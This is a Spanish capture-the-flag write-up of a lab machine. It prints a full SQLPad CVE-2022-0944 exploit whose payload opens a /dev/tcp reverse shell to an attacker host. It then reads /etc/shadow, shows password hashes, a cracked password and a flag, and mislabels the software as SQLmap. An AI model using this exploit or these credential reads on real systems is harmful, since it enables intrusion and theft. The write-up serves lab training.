## Payload / CVE used
- CVE-2022-0944   ([vulnhub](https://vuldb.com/es/?id.194925))
- 

---
# [[CVE-2022-0944  ]]
Versiones afectadas : SQLmap <= 6.10.0

Usamos el siguiente script de python que explota esta vulnerabilidad:
https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944


---
###  Codigo exploit
``` python
import argparse
import requests

def main():
   
    parser = argparse.ArgumentParser(description="CVE-2022-0944 RCE Exploit")
    parser.add_argument('root_url', help="Root URL of the SQLPad application")
    parser.add_argument('attacker_ip', help="attacker ip")
    parser.add_argument('attacker_port', help="attacker port")
    
    args = parser.parse_args()

    target_url = f"{args.root_url}/api/test-connection"

    payload = f"{{{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1\"') }}}}"

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    #POST data (JSON body of the request)
    data = {
        "name": "test",
        "driver": "mysql",
        "data": {
            "database": payload
        },
        "database": payload
    }

    try:
        response = requests.post(target_url, headers=headers, json=data)
       
        print(f"Response status code: {response.status_code}")
        print(f"Response body: {response.text}")

        if response.status_code == 200:
            print(f"Exploit sent successfully. Check your listener on {args.attacker_ip}:{args.attacker_port}")
        else:
            print(f"Exploit sent, but server responded with status code: {response.status_code}. Check your listener.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

El codigo manda un exploit a la url indicada realizando una reverse shell , el codigo se aprovecha de la vulnerabilidad de la API  en la ruta "/api/test-connection"

![[Pasted image 20241119185337.png]]
#### Poc
 


--- 

## Lateral Movement
Primero observamos que estamos en un contenedor de docker , nos dirigimos a la raiz
```bash
root@c184118df0a6:/# ls

bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6: cat docker-entrypoint
#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@
root@c184118df0a6:/# 
```

En **/etc/passwd** encontramos los siguientes ususarios que puede que existan en el host:

```c
root@c184118df0a6:/# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

el **/etc/shadow** :

```php
root@c184118df0a6:/# cat /etc/shadow
cat /etc/shadow
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:$6$Xp276NMNA6SRQH7D$YxEGuHfFCxPINnra/Xld5xsAX03aw0oBPgdinsiUTQjbrxGbS1zZeSW.IH.brqu2PlQofZUJqkJFUisre0aa90:20046:0:99999:7:::
```
parece que el hash del usuario **michael** se encuentra en ambos pasamos a desencriptarlo con la herramienta **john**:
![[Pasted image 20241119191009.png]]

```java
insaneclownposse
```

Ahora que tenemos la clave de michael probamos a loguearnos en el host:

```bash
âžœ  exploitation ssh michael@sightless.htb
michael@sightless.htb's password: 
Last login: Tue Nov 19 18:05:31 2024 from 10.10.15.18
michael@sightless:~$ cat user.txt 
ea55a45b7839e324eec11ccd9da90093
```

Ya tenemos la user flag!


En **/var/lib/sqlpad** encontramos :

```bash
root@c184118df0a6:/var/lib/sqlpad# ls
cache
sessions
sqlpad.sqlite
root@c184118df0a6:/var/lib/sqlpad# 
```

Nos pasamos el sqlpad.sqlite a nuestra maquina

### Local enumeration

- /var/lib/sqlpad
- /etc/passwd
- /etc/shadow

### Atack vector

	-  hash de usuario en /etc/shadow

---

